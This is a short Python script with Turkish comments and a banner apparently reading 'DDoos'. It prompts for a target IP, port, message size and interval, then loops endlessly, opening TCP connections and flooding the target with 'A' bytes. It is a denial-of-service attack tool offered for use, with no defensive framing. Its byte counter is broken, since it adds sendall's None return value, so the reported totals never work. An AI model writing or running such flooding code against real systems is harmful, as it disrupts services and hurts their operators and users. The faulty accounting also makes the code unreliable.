import socket
import time

print('''
                                                                                                                             
                                   #                         ######   ######                  
 #   #   ####    ####   #    #    # #     ####    ####       #     #  #     #   ####    ####  
  # #   #    #  #       #   #    #   #   #       #           #     #  #     #  #    #  #      
   #    #    #   ####   ####    #     #   ####    ####       #     #  #     #  #    #   ####  
   #    #    #       #  #  #    #######       #       #      #     #  #     #  #    #       # 
   #    #    #  #    #  #   #   #     #  #    #  #    #      #     #  #     #  #    #  #    # 
   #     ####    ####   #    #  #     #   ####    ####       ######   ######    ####    ####   
                                                                            
                                                                             
''')

# Kullanıcıdan IP adresini alın
ip = input("Hedef IP adresini girin: ")

# Kullanıcıdan port numarasını, mesaj boyutunu (byte cinsinden) ve gönderim aralığını (saniye cinsinden) alın
port = int(input("Port numarasını girin: "))
msg_size = int(input("Mesaj boyutunu (KB cinsinden) girin: ")) * 1024
interval = float(input("Gönderim aralığını (saniye cinsinden) girin: "))

total_sent = 0   # Toplam gönderilen veri miktarını takip etmek için değişken tanımlayın

while True:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((ip, port))

            data = b'A' * msg_size     # Create a large string containing 'A's
            start_time = time.time()   # Start timer
            while ((time.time() - start_time) < interval):
                sent = s.sendall(data)      # Send packets continuously until the specified interval has elapsed
                total_sent += sent          # Gönderilen veri miktarını toplam gönderilen veriyle güncelle
        except Exception as e:
            print("Hata:", str(e))
    
    # Gönderilen veri miktarını ekrana yazdır
    print("Toplam gönderilen veri miktarı:", total_sent)
